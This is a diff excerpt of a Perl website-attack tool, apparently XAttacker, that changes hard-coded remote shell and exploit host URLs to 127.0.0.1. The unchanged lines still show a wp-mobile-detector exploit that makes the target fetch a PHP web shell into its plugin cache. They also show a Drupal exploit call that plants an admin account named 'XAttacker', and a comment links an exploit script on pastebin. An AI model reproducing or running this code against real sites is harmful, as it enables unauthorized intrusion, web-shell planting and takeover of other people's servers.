@@ -1143,7 +1143,7 @@ print color('bold red'),"NOt VULN\n";
 # check the link of the shell or you can upload "wpmobiledetectorshell.zip" on you one shell #
 ##############################################################################################
 sub wpmobiledetector(){ 
-$wpmdshell = "http://testatranslations.com/shell/XAttacker.php";
+$wpmdshell = "http://127.0.0.1/shell/XAttacker.php";
 $url = "$site/wp-content/plugins/wp-mobile-detector/resize.php?src=$wpmdshell";
 $wpmdup="$site/wp-content/plugins/wp-mobile-detector/cache/XAttacker.php?X=Attacker";
 
@@ -6557,7 +6557,7 @@ $ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
 $ua->timeout (20);
 
 # check the link of the exploit or you can download script from here : http://pastebin.com/wPAbtyJ4 and you upload it on you one shell :) 
-$drupalink = "http://oriflame-angela.ru/gassrini.php";
+$drupalink = "http://127.0.0.1/gassrini.php";
 my $exploit = "$drupalink?url=$site&submit=submit";
 $admin ="XAttacker";
 $pass  ="XAttacker";
